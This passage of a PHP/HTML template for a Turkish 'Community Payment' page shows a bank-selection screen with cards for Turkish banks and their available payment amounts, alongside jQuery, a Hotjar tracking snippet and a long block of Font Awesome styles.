<?php
include '../inc/config.php';
?>
<html class="fontawesome-i2svg-active fontawesome-i2svg-complete">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
      function imageChanger(resimSinif) {
  var resimSrc = $('.' + resimSinif).attr('src');
  $('#gbx').attr('src', resimSrc);
}
    </script>
    <title>Community Payment</title>
    <style type="text/css">
      svg:not(:root).svg-inline--fa {
        overflow: visible
      }

      .svg-inline--fa {
        display: inline-block;
        font-size: inherit;
        height: 1em;
        overflow: visible;
        vertical-align: -.125em
      }

      .svg-inline--fa.fa-lg {
        vertical-align: -.225em
      }

      .svg-inline--fa.fa-w-1 {
        width: .0625em
      }

      .svg-inline--fa.fa-w-2 {
        width: .125em
      }

      .svg-inline--fa.fa-w-3 {
        width: .1875em
      }

      .svg-inline--fa.fa-w-4 {
        width: .25em
      }

      .svg-inline--fa.fa-w-5 {
        width: .3125em
      }

      .svg-inline--fa.fa-w-6 {
        width: .375em
      }

      .svg-inline--fa.fa-w-7 {
        width: .4375em
      }

      .svg-inline--fa.fa-w-8 {
        width: .5em
      }

      .svg-inline--fa.fa-w-9 {
        width: .5625em
      }

      .svg-inline--fa.fa-w-10 {
        width: .625em
      }

      .svg-inline--fa.fa-w-11 {
        width: .6875em
      }

      .svg-inline--fa.fa-w-12 {
        width: .75em
      }

      .svg-inline--fa.fa-w-13 {
        width: .8125em
      }

      .svg-inline--fa.fa-w-14 {
        width: .875em
      }

      .svg-inline--fa.fa-w-15 {
        width: .9375em
      }

      .svg-inline--fa.fa-w-16 {
        width: 1em
      }

      .svg-inline--fa.fa-w-17 {
        width: 1.0625em
      }

      .svg-inline--fa.fa-w-18 {
        width: 1.125em
      }

      .svg-inline--fa.fa-w-19 {
        width: 1.1875em
      }

      .svg-inline--fa.fa-w-20 {
        width: 1.25em
      }

      .svg-inline--fa.fa-pull-left {
        margin-right: .3em;
        width: auto
      }

      .svg-inline--fa.fa-pull-right {
        margin-left: .3em;
        width: auto
      }

      .svg-inline--fa.fa-border {
        height: 1.5em
      }

      .svg-inline--fa.fa-li {
        width: 2em
      }

      .svg-inline--fa.fa-fw {
        width: 1.25em
      }

      .fa-layers svg.svg-inline--fa {
        bottom: 0;
        left: 0;
        margin: auto;
        position: absolute;
        right: 0;
        top: 0
      }

      .fa-layers {
        display: inline-block;
        height: 1em;
        position: relative;
        text-align: center;
        vertical-align: -.125em;
        width: 1em
      }

      .fa-layers svg.svg-inline--fa {
        -webkit-transform-origin: center center;
        transform-origin: center center
      }

      .fa-layers-counter,
      .fa-layers-text {
        display: inline-block;
        position: absolute;
        text-align: center
      }

      .fa-layers-text {
        left: 50%;
        top: 50%;
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        -webkit-transform-origin: center center;
        transform-origin: center center
      }

      .fa-layers-counter {
        background-color: #ff253a;
        border-radius: 1em;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        color: #fff;
        height: 1.5em;
        line-height: 1;
        max-width: 5em;
        min-width: 1.5em;
        overflow: hidden;
        padding: .25em;
        right: 0;
        text-overflow: ellipsis;
        top: 0;
        -webkit-transform: scale(.25);
        transform: scale(.25);
        -webkit-transform-origin: top right;
        transform-origin: top right
      }

      .fa-layers-bottom-right {
        bottom: 0;
        right: 0;
        top: auto;
        -webkit-transform: scale(.25);
        transform: scale(.25);
        -webkit-transform-origin: bottom right;
        transform-origin: bottom right
      }

      .fa-layers-bottom-left {
        bottom: 0;
        left: 0;
        right: auto;
        top: auto;
        -webkit-transform: scale(.25);
        transform: scale(.25);
        -webkit-transform-origin: bottom left;
        transform-origin: bottom left
      }

      .fa-layers-top-right {
        right: 0;
        top: 0;
        -webkit-transform: scale(.25);
        transform: scale(.25);
        -webkit-transform-origin: top right;
        transform-origin: top right
      }

      .fa-layers-top-left {
        left: 0;
        right: auto;
        top: 0;
        -webkit-transform: scale(.25);
        transform: scale(.25);
        -webkit-transform-origin: top left;
        transform-origin: top left
      }

      .fa-lg {
        font-size: 1.3333333333em;
        line-height: .75em;
        vertical-align: -.0667em
      }

      .fa-xs {
        font-size: .75em
      }

      .fa-sm {
        font-size: .875em
      }

      .fa-1x {
        font-size: 1em
      }

      .fa-2x {
        font-size: 2em
      }

      .fa-3x {
        font-size: 3em
      }

      .fa-4x {
        font-size: 4em
      }

      .fa-5x {
        font-size: 5em
      }

      .fa-6x {
        font-size: 6em
      }

      .fa-7x {
        font-size: 7em
      }

      .fa-8x {
        font-size: 8em
      }

      .fa-9x {
        font-size: 9em
      }

      .fa-10x {
        font-size: 10em
      }

      .fa-fw {
        text-align: center;
        width: 1.25em
      }

      .fa-ul {
        list-style-type: none;
        margin-left: 2.5em;
        padding-left: 0
      }

      .fa-ul>li {
        position: relative
      }

      .fa-li {
        left: -2em;
        position: absolute;
        text-align: center;
        width: 2em;
        line-height: inherit
      }

      .fa-border {
        border: solid .08em #eee;
        border-radius: .1em;
        padding: .2em .25em .15em
      }

      .fa-pull-left {
        float: left
      }

      .fa-pull-right {
        float: right
      }

      .fa.fa-pull-left,
      .fab.fa-pull-left,
      .fal.fa-pull-left,
      .far.fa-pull-left,
      .fas.fa-pull-left {
        margin-right: .3em
      }

      .fa.fa-pull-right,
      .fab.fa-pull-right,
      .fal.fa-pull-right,
      .far.fa-pull-right,
      .fas.fa-pull-right {
        margin-left: .3em
      }

      .fa-spin {
        -webkit-animation: fa-spin 2s infinite linear;
        animation: fa-spin 2s infinite linear
      }

      .fa-pulse {
        -webkit-animation: fa-spin 1s infinite steps(8);
        animation: fa-spin 1s infinite steps(8)
      }

      @-webkit-keyframes fa-spin {
        0% {
          -webkit-transform: rotate(0);
          transform: rotate(0)
        }

        100% {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg)
        }
      }

      @keyframes fa-spin {
        0% {
          -webkit-transform: rotate(0);
          transform: rotate(0)
        }

        100% {
          -webkit-transform: rotate(360deg);
          transform: rotate(360deg)
        }
      }

      .fa-rotate-90 {
        -webkit-transform: rotate(90deg);
        transform: rotate(90deg)
      }

      .fa-rotate-180 {
        -webkit-transform: rotate(180deg);
        transform: rotate(180deg)
      }

      .fa-rotate-270 {
        -webkit-transform: rotate(270deg);
        transform: rotate(270deg)
      }

      .fa-flip-horizontal {
        -webkit-transform: scale(-1, 1);
        transform: scale(-1, 1)
      }

      .fa-flip-vertical {
        -webkit-transform: scale(1, -1);
        transform: scale(1, -1)
      }

      .fa-flip-both,
      .fa-flip-horizontal.fa-flip-vertical {
        -webkit-transform: scale(-1, -1);
        transform: scale(-1, -1)
      }

      :root .fa-flip-both,
      :root .fa-flip-horizontal,
      :root .fa-flip-vertical,
      :root .fa-rotate-180,
      :root .fa-rotate-270,
      :root .fa-rotate-90 {
        -webkit-filter: none;
        filter: none
      }

      .fa-stack {
        display: inline-block;
        height: 2em;
        position: relative;
        width: 2.5em
      }

      .fa-stack-1x,
      .fa-stack-2x {
        bottom: 0;
        left: 0;
        margin: auto;
        position: absolute;
        right: 0;
        top: 0
      }

      .svg-inline--fa.fa-stack-1x {
        height: 1em;
        width: 1.25em
      }

      .svg-inline--fa.fa-stack-2x {
        height: 2em;
        width: 2.5em
      }

      .fa-inverse {
        color: #fff
      }

      .sr-only {
        border: 0;
        clip: rect(0, 0, 0, 0);
        height: 1px;
        margin: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px
      }

      .sr-only-focusable:active,
      .sr-only-focusable:focus {
        clip: auto;
        height: auto;
        margin: 0;
        overflow: visible;
        position: static;
        width: auto
      }

      .svg-inline--fa .fa-primary {
        fill: var(--fa-primary-color, currentColor);
        opacity: 1;
        opacity: var(--fa-primary-opacity, 1)
      }

      .svg-inline--fa .fa-secondary {
        fill: var(--fa-secondary-color, currentColor);
        opacity: .4;
        opacity: var(--fa-secondary-opacity, .4)
      }

      .svg-inline--fa.fa-swap-opacity .fa-primary {
        opacity: .4;
        opacity: var(--fa-secondary-opacity, .4)
      }

      .svg-inline--fa.fa-swap-opacity .fa-secondary {
        opacity: 1;
        opacity: var(--fa-primary-opacity, 1)
      }

      .svg-inline--fa mask .fa-primary,
      .svg-inline--fa mask .fa-secondary {
        fill: #000
      }

      .fad.fa-inverse {
        color: #fff
      }
    </style>
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,600,700" rel="stylesheet">
    <!-- Hotjar Tracking Code -->
    <script>
      (function(h, o, t, j, a, r) {
        h.hj = h.hj || function() {
          (h.hj.q = h.hj.q || []).push(arguments)
        };
        h._hjSettings = {
          hjid: 1377433,
          hjsv: 6
        };
        a = o.getElementsByTagName('head')[0];
        r = o.createElement('script');
        r.async = 1;
        r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
        a.appendChild(r);
      })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
    </script>
    <script async="" src="https://static.hotjar.com/c/hotjar-1377433.js?sv=6"></script>
    <link href="assets/bundle-01-113503b5539ef5ae8968.css" rel="stylesheet">
    <link href="assets/bundle-cee4d11e76e5a6a13fb9.css" rel="stylesheet">
  </head>
  <body data-gr-c-s-loaded="true" cz-shortcut-listen="true">
    <div id="app">
      <div>
        <div class="top">
          <div class="d-flex flex-column flex-md-row px-4 pt-2 pb-0">
            <h5 class="my-0 mr-md-auto font-weight-normal w-25">
              <a class="close-x" style="opacity: 0;">
                <span aria-hidden="true">×</span>
              </a>
            </h5>
            <div class="dropdown bootstrap-select">
              <select class="selectpicker" tabindex="-98">
                <option value="en">English</option>
                <option value="tr" selected="">Türkçe</option>
              </select>
              <button type="button" class="btn dropdown-toggle btn-light" data-toggle="dropdown" role="combobox" aria-owns="bs-select-24" aria-haspopup="listbox" aria-expanded="false" title="Türkçe">
                <div class="filter-option">
                  <div class="filter-option-inner">
                    <div class="filter-option-inner-inner">Türkçe</div>
                  </div>
                </div>
              </button>
              <div class="dropdown-menu ">
                <div class="inner show" role="listbox" id="bs-select-24" tabindex="-1">
                  <ul class="dropdown-menu inner show" role="presentation"></ul>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="container content">
          <div class="row">
            <div class="mx-auto">
              <div class="d-flex flex-column h-70 justify-content-center text-center" id="step-1">
                <div class="card-deck mx-0">
                  <div>
                    <div class="payment-header px-4 pt-0 pb-2 mx-auto text-center banks-list-header">
                      <h3 class="step-title">Banka seç</h3>
                      <div class="amounts-filter input-with-icon form-group">
                        <svg class="svg-inline--fa fa-search-dollar fa-w-16 input-icon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search-dollar" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg="">
                          <path fill="currentColor" d="M505.04 442.66l-99.71-99.69c-4.5-4.5-10.6-7-17-7h-16.3c27.6-35.3 44-79.69 44-127.99C416.03 93.09 322.92 0 208.02 0S0 93.09 0 207.98s93.11 207.98 208.02 207.98c48.3 0 92.71-16.4 128.01-44v16.3c0 6.4 2.5 12.5 7 17l99.71 99.69c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.59.1-33.99zm-297.02-90.7c-79.54 0-144-64.34-144-143.98 0-79.53 64.35-143.98 144-143.98 79.54 0 144 64.34 144 143.98 0 79.53-64.35 143.98-144 143.98zm27.11-152.54l-45.01-13.5c-5.16-1.55-8.77-6.78-8.77-12.73 0-7.27 5.3-13.19 11.8-13.19h28.11c4.56 0 8.96 1.29 12.82 3.72 3.24 2.03 7.36 1.91 10.13-.73l11.75-11.21c3.53-3.37 3.33-9.21-.57-12.14-9.1-6.83-20.08-10.77-31.37-11.35V112c0-4.42-3.58-8-8-8h-16c-4.42 0-8 3.58-8 8v16.12c-23.63.63-42.68 20.55-42.68 45.07 0 19.97 12.99 37.81 31.58 43.39l45.01 13.5c5.16 1.55 8.77 6.78 8.77 12.73 0 7.27-5.3 13.19-11.8 13.19h-28.1c-4.56 0-8.96-1.29-12.82-3.72-3.24-2.03-7.36-1.91-10.13.73l-11.75 11.21c-3.53 3.37-3.33 9.21.57 12.14 9.1 6.83 20.08 10.77 31.37 11.35V304c0 4.42 3.58 8 8 8h16c4.42 0 8-3.58 8-8v-16.12c23.63-.63 42.68-20.54 42.68-45.07 0-19.97-12.99-37.81-31.59-43.39z"></path>
                        </svg>
                        <!-- <i class="fas fa-search-dollar input-icon" aria-hidden="true"></i> -->
                        <input placeholder="Tutarı filtrele" pattern="\d*" step="any" data-lpignore="true" autocomplete="" type="number" class="data-hj-whitelist form-control" value="">
                      </div>
                    </div>
                    <div class="d-flex flex-column banks-list">
                      <div class="amounts-filter input-with-icon form-group">
                        <svg class="svg-inline--fa fa-search-dollar fa-w-16 input-icon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search-dollar" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg="">
                          <path fill="currentColor" d="M505.04 442.66l-99.71-99.69c-4.5-4.5-10.6-7-17-7h-16.3c27.6-35.3 44-79.69 44-127.99C416.03 93.09 322.92 0 208.02 0S0 93.09 0 207.98s93.11 207.98 208.02 207.98c48.3 0 92.71-16.4 128.01-44v16.3c0 6.4 2.5 12.5 7 17l99.71 99.69c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.59.1-33.99zm-297.02-90.7c-79.54 0-144-64.34-144-143.98 0-79.53 64.35-143.98 144-143.98 79.54 0 144 64.34 144 143.98 0 79.53-64.35 143.98-144 143.98zm27.11-152.54l-45.01-13.5c-5.16-1.55-8.77-6.78-8.77-12.73 0-7.27 5.3-13.19 11.8-13.19h28.11c4.56 0 8.96 1.29 12.82 3.72 3.24 2.03 7.36 1.91 10.13-.73l11.75-11.21c3.53-3.37 3.33-9.21-.57-12.14-9.1-6.83-20.08-10.77-31.37-11.35V112c0-4.42-3.58-8-8-8h-16c-4.42 0-8 3.58-8 8v16.12c-23.63.63-42.68 20.55-42.68 45.07 0 19.97 12.99 37.81 31.58 43.39l45.01 13.5c5.16 1.55 8.77 6.78 8.77 12.73 0 7.27-5.3 13.19-11.8 13.19h-28.1c-4.56 0-8.96-1.29-12.82-3.72-3.24-2.03-7.36-1.91-10.13.73l-11.75 11.21c-3.53 3.37-3.33 9.21.57 12.14 9.1 6.83 20.08 10.77 31.37 11.35V304c0 4.42 3.58 8 8 8h16c4.42 0 8-3.58 8-8v-16.12c23.63-.63 42.68-20.54 42.68-45.07 0-19.97-12.99-37.81-31.59-43.39z"></path>
                        </svg>
                        <!-- <i class="fas fa-search-dollar input-icon" aria-hidden="true"></i> -->
                        <input placeholder="Tutarı filtrele" pattern="\d*" step="any" data-lpignore="true" autocomplete="" type="number" class="data-hj-whitelist form-control" value="">
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/TGBATRIS-96f6374ca4f6e56a67ebe6d6983cfcc1.png" alt="Garanti" class="goster resim-1 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-1 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/YAPITRIS-898a0d37ae3716ff970fa4c1ace6bd21.svg" alt="Yapı" class="goster resim-2 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-2 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/TCZBTR2A-0178d49fcf102d2ac5f4d93d7a8d2141.png" alt="Ziraat" class="goster resim-3 mx-auto">
                        </div>
                        
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-3 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/AKBKTRIS-2d4e65008f7655ba4d5b7fe90459d09e.png" alt="Ak" class="goster resim-4 mx-auto">
                        </div>
                        
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-4 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/FNNBTRIS-fc277ac4cd35df9fa9292dea589f7005.png" alt="QNB Finans" class="goster resim-5 mx-auto">
                        </div>
                        
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-5 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/DENITRIS-18bf184786dffad2e26e3a39b9bd0c8f.svg" alt="Deniz" class="goster resim-6 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-6 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/TRHBTR2A-a3a47ce2102b74ba3623115b484cc057.svg" alt="Halk" class="goster resim-7 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-7 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://secure.community-payments.com/banks_logo/INGBTRIS-9d4356700bda24e8e7af76432d4a1596.png" alt="ING" class="goster resim-8 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-8 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://upload.wikimedia.org/wikipedia/tr/c/c5/Fibabanka.png?20211102181822" alt="Fiba" class="goster resim-10 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-10 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://www.hsbc.com.tr/_assets/img/logo-2x.png" alt="Hsbc" class="goster resim-11 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-11 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://files.sikayetvar.com/lg/cmp/31/31373.svg?1522650125" alt="Odea" class="goster resim-12 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-12 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://www.sekerbank.com.tr/icons/sekerbank-logo.svg" alt="Seker" class="goster resim-13 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-13 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://files.sikayetvar.com/lg/cmp/46/462.svg?1522650125g" alt="Isbank" class="goster resim-14 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-14 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://www.albaraka.com.tr/_assets/img/albaraka-logo.svg" alt="Albaraka" class="goster resim-15 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-15 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://www.turkiyefinans.com.tr/SiteAssets/img/tfkb-logo_2x.png" alt="TrFinans" class="goster resim-16 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-16 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://www.ziraatkatilim.com.tr/themes/custom/zk/logo.svg" alt="Zkatilim" class="goster resim-17 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-17 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
                      <div class="d-flex flex-row card mb-2 shadow-card">
                        <div class="bank-logo d-flex align-items-center">
                          <img src="https://www.vakifkatilim.com.tr/assets/img/logo-d.svg" alt="Vkatilim" class="goster resim-18 mx-auto">
                        </div>
                       
                        <div class="bank-button d-flex align-items-center">
                          <button class="goster-buton resim-18 btn btn-primary">
                            <i class="arrow right"></i>
                          </button>
                        </div>
                      </div>
    </div>
                    <div class="d-flex flex-row flex-wrap justify-content-around text-center banks-boxes">
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/TGBATRIS-96f6374ca4f6e56a67ebe6d6983cfcc1.png" class="goster resim-1 mx-auto" alt="Garanti">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 78</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺408.20</li>
                            <li>₺500</li>
                            <li>₺525</li>
                            <li>₺651.02</li>
                            <li>
                              <a class="more-amounts">+ 74 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-1 btn-lg btn-block mt-auto btn btn-primary" aria-label="Garanti">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/YAPITRIS-898a0d37ae3716ff970fa4c1ace6bd21.svg" class="goster resim-2 mx-auto" alt="Yapı">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 155</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺100</li>
                            <li>₺250</li>
                            <li>₺260</li>
                            <li>₺270</li>
                            <li>
                              <a class="more-amounts">+ 151 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-2 btn-lg btn-block mt-auto btn btn-primary" aria-label="Yapı">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/TCZBTR2A-0178d49fcf102d2ac5f4d93d7a8d2141.png" class="goster resim-3 mx-auto" alt="Ziraat">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 80</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺160</li>
                            <li>₺500</li>
                            <li>₺600</li>
                            <li>₺700</li>
                            <li>
                              <a class="more-amounts">+ 76 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-3 btn-lg btn-block mt-auto btn btn-primary" aria-label="Ziraat">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/AKBKTRIS-2d4e65008f7655ba4d5b7fe90459d09e.png" class="goster resim-4 mx-auto" alt="Ak">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 126</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺100</li>
                            <li>₺122</li>
                            <li>₺125</li>
                            <li>₺129</li>
                            <li>
                              <a class="more-amounts">+ 122 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-4 btn-lg btn-block mt-auto btn btn-primary" aria-label="Ak">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/FNNBTRIS-fc277ac4cd35df9fa9292dea589f7005.png" class="goster resim-5 mx-auto" alt="QNB Finans">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 16</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺250</li>
                            <li>₺255</li>
                            <li>₺285</li>
                            <li>₺299</li>
                            <li>
                              <a class="more-amounts">+ 12 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-5 btn-lg btn-block mt-auto btn btn-primary" aria-label="QNB Finans">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/DENITRIS-18bf184786dffad2e26e3a39b9bd0c8f.svg" class="goster resim-6 mx-auto" alt="Deniz">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 97</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺100</li>
                            <li>₺150</li>
                            <li>₺200</li>
                            <li>₺201</li>
                            <li>
                              <a class="more-amounts">+ 93 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-6 btn-lg btn-block mt-auto btn btn-primary" aria-label="Deniz">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/TRHBTR2A-a3a47ce2102b74ba3623115b484cc057.svg" class="goster resim-7 mx-auto" alt="Halk">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 26</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺300</li>
                            <li>₺356</li>
                            <li>₺400</li>
                            <li>₺409</li>
                            <li>
                              <a class="more-amounts">+ 22 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-7 btn-lg btn-block mt-auto btn btn-primary" aria-label="Halk">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/INGBTRIS-9d4356700bda24e8e7af76432d4a1596.png" class="goster resim-8 mx-auto" alt="ING">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 35</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺100</li>
                            <li>₺150</li>
                            <li>₺400</li>
                            <li>₺450</li>
                            <li>
                              <a class="more-amounts">+ 31 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-8 btn-lg btn-block mt-auto btn btn-primary" aria-label="ING">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                            <img src="https://secure.community-payments.com/banks_logo/KTEFTRIS-a1637063226c9c1cea631c63b327198c.png" class="goster resim-9 mx-auto" alt="Kuveyt">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
                          </ul>
                          <button type="button" class="goster-buton resim-9 btn-lg btn-block mt-auto btn btn-primary" aria-label="Kuveyt">Seç</button>
                        </div>
                      </div>
                      <div class="card mb-3 mx-2 shadow-card">
                        <div class="card-header">
                          <div class="bank-logo mx-auto">
                          <img src="https://upload.wikimedia.org/wikipedia/tr/c/c5/Fibabanka.png?20211102181822" alt="Fiba" class="goster resim-10 mx-auto">
                          </div>
                        </div>
                        <div class="card-body pb-3 d-flex flex-column">
                          <p class="card-subtext-sm">şu anda mevcut olan miktar 21</p>
                          <ul class="list-unstyled amounts-list">
                            <li>₺1500</li>
                            <li>₺2000</li>
                            <li>₺2020</li>
                            <li>₺2500</li>
                            <li>
                              <a class="more-amounts">+ 17 daha</a>
                            </li>
